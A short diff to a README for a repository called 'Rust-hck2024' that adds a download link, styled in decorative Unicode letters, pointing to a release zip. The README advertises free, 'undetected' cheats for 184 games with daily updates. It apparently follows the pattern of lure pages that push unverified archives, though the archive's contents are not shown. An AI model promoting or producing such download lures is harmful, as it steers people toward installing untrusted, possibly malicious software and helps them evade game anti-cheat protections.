@@ -1,6 +1,6 @@
 # Rust-hck2024
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/hanachaari/Rust-hck2024/releases/download/Rust-hck2024/Rust-hck2024.zip)
 
 
 ## Unique program created specifically for github contains 184 supported games in undetected status with daily updates for free
